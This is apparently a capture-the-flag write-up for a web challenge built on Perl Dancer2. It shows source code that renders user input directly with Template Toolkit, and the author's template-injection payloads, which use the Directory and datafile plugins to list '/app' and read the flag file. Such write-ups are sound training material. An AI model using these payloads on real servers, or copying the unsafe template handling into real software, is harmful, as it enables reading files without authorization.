## Description
Google sẽ cho bạn tất cả đáp án ^_^. Flag nằm ở /app/flag.txt
## Hints 
none
## Solution
This is the website for the challenge:

![image](https://github.com/user-attachments/assets/d747b2cd-7bed-4705-97b6-fcc10d5c1147)

Here’s the source code of the website:

```
use strict;
use warnings;

use Dancer2;
use Template;


get '/' => sub {
    my $greeting = "Template_toolkit";
    template 'index' => {
        greeting => $greeting
    };
};

post '/debug' => sub {
    my $input = body_parameters->get('debug');
    my $output;
    
    my $template = Template->new({
        INCLUDE_PATH => './views'
    });
    $template->process(\$input, {}, \$output) or die $template->error();
    return $output;
};

start;
```
From the source code, we can see that the challenge uses a template engine called: [Template toolkit](https://template-toolkit.org/), and with the hint we could try to do something with the `/debug` page with POST method.

A quick Google search for `Template Toolkit debug` gave me some useful ways to exploit the website: https://template-toolkit.org/docs/manual/Config.html

I started with a simple payload to check if it would works: `debug=[% 'hello' %]`, and the page return the word hello.

That's interesting to know, now i could try a more complex payload to get the flag.

Here’s one possible solution:

`debug=`

`[% USE dir = Directory('/app') %]`: assigning the directories from the path `/app` to the variable `dir` 

`[% FOREACH file = dir.files %]`: loop through files in the directory specified by the `dir` variable

`[% file.name %]`: prints the name of the files

`[% END %]`: closes the FOREACH loop

When executed, this payload returns a list of files:

![image](https://github.com/user-attachments/assets/fba82678-24ff-4502-8cbe-5fbb240b85c7)

Now that we khow where the flag is, we just need to extract it.

I used the following payload:

`debug=`

`[% USE userlist = datafile('/app/flag.txt', delim = ' ') %]`: assigning the content of the file `/app/flag.txt` to `userlist`, using datafile plugin with the delimiter, in this case is the space character.

`[% FOREACH record = userlist %]`: creates a list of records, userlist contains the records from the flag.txt file.

`[% record.Here %]`: print the content of the records

`[% END %]`: closes the FOREACH loop

We got the flag eventually.

![Screenshot 2024-08-18 131638](https://github.com/user-attachments/assets/19738ba2-f36e-4915-a6bc-caddad1ae609)





